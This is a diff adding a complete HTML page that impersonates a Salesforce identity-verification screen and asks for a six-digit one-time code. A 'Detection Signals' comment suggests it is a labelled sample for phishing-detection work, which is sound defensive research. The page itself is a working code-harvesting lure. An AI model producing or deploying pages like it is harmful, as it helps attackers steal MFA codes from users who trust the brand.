@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salesforce - Identity Verification</title>
+    <style>
+        body { font-family: 'Salesforce Sans', Arial, sans-serif; background: #f3f3f3; margin: 0; padding: 20px; }
+        .sf-container { max-width: 500px; margin: 50px auto; background: white; border-radius: 8px; box-shadow: 0 2px 16px rgba(0,0,0,0.1); padding: 40px; }
+        .sf-logo { text-align: center; margin-bottom: 30px; font-size: 30px; font-weight: 700; color: #0176d3; }
+        .sf-title { color: #080707; font-size: 26px; margin-bottom: 15px; font-weight: 700; }
+        .sf-text { color: #3e3e3c; line-height: 1.6; margin-bottom: 25px; }
+        .sf-input-wrapper { margin-bottom: 20px; }
+        .sf-label { display: block; color: #3e3e3c; margin-bottom: 8px; font-weight: 600; font-size: 14px; }
+        .sf-input { width: 100%; padding: 13px; border: 1px solid #c9c9c9; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        .sf-input:focus { border-color: #0176d3; outline: none; box-shadow: 0 0 0 3px rgba(1, 118, 211, 0.15); }
+        .sf-button { width: 100%; padding: 14px; background: #0176d3; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        .sf-button:hover { background: #014486; }
+    </style>
+</head>
+<body>
+    <!-- Detection Signals: SaaS domain: salesforce, CRM platform -->
+    <div class="sf-container">
+        <div class="sf-logo">Salesforce</div>
+        <h1 class="sf-title">Identity Verification</h1>
+        <p class="sf-text">Please enter the verification code sent to your device.</p>
+        <form id="verifyForm" action="/identity/verify" method="POST">
+            <div class="sf-input-wrapper">
+                <label for="verifyCode" class="sf-label">Verification Code</label>
+                <input type="tel" id="verifyCode" name="verify_code" class="sf-input" placeholder="000000" maxlength="6" pattern="[0-9]{6}" inputmode="numeric" autocomplete="one-time-code" required />
+            </div>
+            <button type="submit" class="sf-button">Verify</button>
+        </form>
+    </div>
+</body>
+</html>
